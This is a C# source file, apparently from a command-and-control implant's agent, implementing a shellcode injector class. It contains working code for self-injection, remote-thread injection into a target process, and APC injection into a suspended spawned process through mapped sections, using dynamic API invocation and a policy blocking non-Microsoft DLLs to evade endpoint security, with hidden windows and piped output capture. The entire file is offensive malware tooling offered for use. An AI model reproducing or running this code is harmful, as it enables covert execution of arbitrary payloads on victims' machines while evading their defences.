﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using DInvoke.DynamicInvoke;

namespace Agent.Internal
{
    public class InjectionResult
    {
        public bool Succeed { get; set; } = true;
        public string Error { get; set; }
        public string Output { get; set; } = String.Empty;
    }

    public static class Injector
    {

        public static InjectionResult InjectSelfWithOutput(byte[] shellcode)
        {
            var ret = new InjectionResult();
            var currentOut = Console.Out;
            var currentError = Console.Out;
            using (var ms = new MemoryStream())
            using (var sw = new StreamWriter(ms))
            {
                Console.SetOut(sw);
                Console.SetError(sw);
                sw.AutoFlush = true;


                ret = InjectSelf(shellcode);

                Console.Out.Flush();
                Console.Error.Flush();

                Console.SetOut(currentOut);
                Console.SetError(currentError);

                var output = Encoding.UTF8.GetString(ms.ToArray());

                ret.Output = output;
            }
            return ret;
        }

        public static void SpawnInject(byte[] shellcode, string processName)
        {
            var app = processName;

            const uint CREATE_SUSPENDED = 0x00000004;
            const uint DETACHED_PROCESS = 0x00000008;
            const uint CREATE_NO_WINDOW = 0x08000000; ;

            var startupInfoEx = new STARTUPINFOEX();
            var result = DInvoke.DynamicInvoke.Process.CreateProcess(
                app,
                null,
                CREATE_SUSPENDED | CREATE_NO_WINDOW | DETACHED_PROCESS,
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                ref startupInfoEx,
                out var processInfo);

            var procId = processInfo.dwProcessId;
            if (procId == 0)
            {
                throw new InvalidOperationException("Process was not started!");
            }

            const uint GENERIC_ALL = 0x10000000;
            const uint PAGE_EXECUTE_READWRITE = 0x40;
            const uint SEC_COMMIT = 0x08000000;

            var hLocalSection = IntPtr.Zero;
            var maxSize = (ulong)shellcode.Length;

            var status = DInvoke.DynamicInvoke.Native.NtCreateSection(
                ref hLocalSection,
                GENERIC_ALL,
                IntPtr.Zero,
                ref maxSize,
                PAGE_EXECUTE_READWRITE,
                SEC_COMMIT,
                IntPtr.Zero);

            const uint PAGE_READWRITE = 0x04;

            var self = System.Diagnostics.Process.GetCurrentProcess();
            var hLocalBaseAddress = IntPtr.Zero;

            status = DInvoke.DynamicInvoke.Native.NtMapViewOfSection(
                hLocalSection,
                self.Handle,
                ref hLocalBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                ref maxSize,
                2,
                0,
                PAGE_READWRITE);

            const uint PAGE_EXECUTE_READ = 0x20;

            var hRemoteBaseAddress = IntPtr.Zero;

            status = DInvoke.DynamicInvoke.Native.NtMapViewOfSection(
                hLocalSection,
                processInfo.hProcess,
                ref hRemoteBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                ref maxSize,
                2,
                0,
                PAGE_EXECUTE_READ);

            Marshal.Copy(shellcode, 0, hLocalBaseAddress, shellcode.Length);

            var res = DInvoke.DynamicInvoke.Process.NtQueueApcThread(
            processInfo.hThread,
            hRemoteBaseAddress,
            IntPtr.Zero,
            IntPtr.Zero,
            IntPtr.Zero);

            _ = DInvoke.DynamicInvoke.Process.NtResumeThread(processInfo.hThread);
        }


        public static InjectionResult SpawnInjectWithOutput(byte[] shellcode, string processPath)
        {
            var ret = new InjectionResult();

            try
            {
                var startupInfoEx = new DInvoke.DynamicInvoke.STARTUPINFOEX();

                _ = DInvoke.DynamicInvoke.Process.InitializeProcThreadAttributeList(ref startupInfoEx.lpAttributeList, 2);

                const long BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
                const int MITIGATION_POLICY = 0x20007;

                var blockDllPtr = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(blockDllPtr, new IntPtr(BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));

                _ = DInvoke.DynamicInvoke.Process.UpdateProcThreadAttribute(
                    ref startupInfoEx.lpAttributeList,
                    (IntPtr)MITIGATION_POLICY,
                    ref blockDllPtr);

                const uint USE_STD_HANDLES = 0x00000100;

                DInvoke.DynamicInvoke.SECURITY_ATTRIBUTES saAttr = new DInvoke.DynamicInvoke.SECURITY_ATTRIBUTES();
                saAttr.bInheritHandle = true;
                saAttr.lpSecurityDescriptor = IntPtr.Zero;

                //Create pipe to read std out
                DInvoke.DynamicInvoke.Process.CreatePipe(out var outPipe_rd, out var outPipe_w, ref saAttr);

                // Ensure the read handle to the pipe for STDOUT is not inherited.
                DInvoke.DynamicInvoke.Process.SetHandleInformation(outPipe_rd, DInvoke.DynamicInvoke.HANDLE_FLAGS.INHERIT, 0);

                startupInfoEx.StartupInfo.hStdError = outPipe_w;
                startupInfoEx.StartupInfo.hStdOutput = outPipe_w;

                startupInfoEx.StartupInfo.dwFlags |= USE_STD_HANDLES;


                const uint CREATE_SUSPENDED = 0x00000004;
                const uint CREATE_NO_WINDOW = 0x08000000;
                const uint EXTENDED_STARTUP_INFO_PRESENT = 0x00080000;

                DInvoke.DynamicInvoke.Process.CreateProcess(
                    processPath,
                    null,
                    EXTENDED_STARTUP_INFO_PRESENT | CREATE_NO_WINDOW | CREATE_SUSPENDED,
                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    ref startupInfoEx,
                    out var pInfo, true);


                //Inject=====================================================================================================================================================

                DInvoke.DynamicInvoke.Process.CloseHandle(outPipe_w);

                var procId = pInfo.dwProcessId;
                if (procId == 0)
                {
                    throw new InvalidOperationException("Process was not started!");
                }

                const uint GENERIC_ALL = 0x10000000;
                const uint PAGE_EXECUTE_READWRITE = 0x40;
                const uint SEC_COMMIT = 0x08000000;

                var hLocalSection = IntPtr.Zero;
                var maxSize = (ulong)shellcode.Length;

                var status = DInvoke.DynamicInvoke.Native.NtCreateSection(
                    ref hLocalSection,
                    GENERIC_ALL,
                    IntPtr.Zero,
                    ref maxSize,
                    PAGE_EXECUTE_READWRITE,
                    SEC_COMMIT,
                    IntPtr.Zero);

                const uint PAGE_READWRITE = 0x04;

                var self = System.Diagnostics.Process.GetCurrentProcess();
                var hLocalBaseAddress = IntPtr.Zero;

                status = DInvoke.DynamicInvoke.Native.NtMapViewOfSection(
                    hLocalSection,
                    self.Handle,
                    ref hLocalBaseAddress,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    ref maxSize,
                    2,
                    0,
                    PAGE_READWRITE);

                const uint PAGE_EXECUTE_READ = 0x20;

                var hRemoteBaseAddress = IntPtr.Zero;

                status = DInvoke.DynamicInvoke.Native.NtMapViewOfSection(
                    hLocalSection,
                    pInfo.hProcess,
                    ref hRemoteBaseAddress,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    ref maxSize,
                    2,
                    0,
                    PAGE_EXECUTE_READ);

                Marshal.Copy(shellcode, 0, hLocalBaseAddress, shellcode.Length);

                var res = DInvoke.DynamicInvoke.Process.NtQueueApcThread(
                pInfo.hThread,
                hRemoteBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero);

                _ = DInvoke.DynamicInvoke.Process.NtResumeThread(pInfo.hThread);


                //Read STDOut until completion===============================================================================================
                System.Diagnostics.Process process = System.Diagnostics.Process.GetProcessById(pInfo.dwProcessId);

                byte[] b = null;
                while (!process.HasExited)
                {
                    b = ReadFromPipe(outPipe_rd);
                    if (b != null)
                    {
                        ret.Output += Encoding.UTF8.GetString(b);
                    }
                    Thread.Sleep(100);
                }
                b = ReadFromPipe(outPipe_rd);
                if (b != null)
                {
                    ret.Output += Encoding.UTF8.GetString(b);
                }

                DInvoke.DynamicInvoke.Process.CloseHandle(outPipe_rd);

                ret.Succeed = true;
                return ret;

            }
            catch (Exception e)
            {
                ret.Error = e.Message;
                ret.Succeed = false;
                return ret;
            }
            finally
            {

            }
        }

        static byte[] ReadFromPipe(IntPtr pipe)
        {
            if (!DInvoke.DynamicInvoke.Process.ReadFile(pipe, out var buff, 1024))
            {
                Console.WriteLine($"Failed reading pipe, error code: {Marshal.GetLastWin32Error()}");
                return null;
            }

            return buff;
        }

        public static InjectionResult InjectSelf(byte[] shellcode)
        {
            var ret = new InjectionResult();
            var baseAddress = Native.Kernel32.VirtualAlloc(
                    IntPtr.Zero,
                    shellcode.Length,
                    Native.Kernel32.AllocationType.Commit |  Native.Kernel32.AllocationType.Reserve,
                    Native.Kernel32.MemoryProtection.ExecuteReadWrite);

            if (baseAddress == IntPtr.Zero)
            {
                ret.Error = $"Failed to allocate memory for shellcode, error code: {Marshal.GetLastWin32Error()}";
                ret.Succeed = false;
                return ret;
            }

            try
            {
                Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

                if (!Native.Kernel32.VirtualProtect(
                    baseAddress,
                    shellcode.Length,
                    Native.Kernel32.MemoryProtection.ExecuteRead,
                    out _))
                {
                    throw new InvalidOperationException($"Failed to change memory to execute, error code: {Marshal.GetLastWin32Error()}");
                }

                uint threadId = 0;
                IntPtr pinfo = IntPtr.Zero;
                IntPtr hThread = Native.Kernel32.CreateThread(
                    0,
                  0,
                  baseAddress,
                  pinfo,
                  0,
                  ref threadId);

                if (hThread == IntPtr.Zero)
                {
                    throw new InvalidOperationException($"Failed to create  thread to start execution of the shellcode, error code: {Marshal.GetLastWin32Error()}");
                }

                Native.Kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            catch (InvalidOperationException e)
            {
                ret.Error = e.Message;
                return ret;
            }
            finally
            {
                Native.Kernel32.VirtualFreeEx(System.Diagnostics.Process.GetCurrentProcess().Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
            }
            ret.Succeed = true;
            return ret;
        }

        public static InjectionResult Inject(System.Diagnostics.Process target, byte[] shellcode, bool waitEndToContinue = false)
        {
            var ret = new InjectionResult();
            var baseAddress = Native.Kernel32.VirtualAllocEx(
                target.Handle,
                IntPtr.Zero,
                shellcode.Length,
                Native.Kernel32.AllocationType.Commit |  Native.Kernel32.AllocationType.Reserve,
                Native.Kernel32.MemoryProtection.ReadWrite);

            if (baseAddress == IntPtr.Zero)
            {
                ret.Error = $"Failed to allocate memory for Loader.dll, error code: {Marshal.GetLastWin32Error()}";
                ret.Succeed = false;
                return ret;
            }

            try
            {
                IntPtr bytesWritten = IntPtr.Zero;
                if (!Native.Kernel32.WriteProcessMemory(target.Handle, baseAddress, shellcode, shellcode.Length, out bytesWritten))
                {
                    ret.Error = $"Failed to write shellcode into the process, error code: {Marshal.GetLastWin32Error()}";
                    ret.Succeed = false;
                    return ret;
                }

                if (bytesWritten.ToInt32() != shellcode.Length)
                {
                    ret.Error = $"Failed to write All the shellcode into the process";
                    ret.Succeed = false;
                    return ret;
                }

                if (!Native.Kernel32.VirtualProtectEx(
                    target.Handle,
                    baseAddress,
                    shellcode.Length,
                    Native.Kernel32.MemoryProtection.ExecuteRead,
                    out _))
                {
                    throw new InvalidOperationException($"Failed to cahnge memory to execute, error code: {Marshal.GetLastWin32Error()}");
                }

                IntPtr threadres = IntPtr.Zero;

                IntPtr thread = Native.Kernel32.CreateRemoteThread(target.Handle, IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out threadres);

                if (thread == IntPtr.Zero)
                {
                    throw new InvalidOperationException($"Failed to create remote thread to start execution of the shellcode, error code: {Marshal.GetLastWin32Error()}");
                }


                if (waitEndToContinue)
                {
                    Native.Kernel32.WaitForSingleObject(thread, 0xFFFFFFFF);
                }
            }
            catch (InvalidOperationException e)
            {
                ret.Error = e.Message;
                ret.Succeed = false;
                return ret;
            }
            finally
            {
                if (waitEndToContinue)
                {
                    Native.Kernel32.VirtualFreeEx(target.Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
                }
            }
            return ret;

        }
    }
}

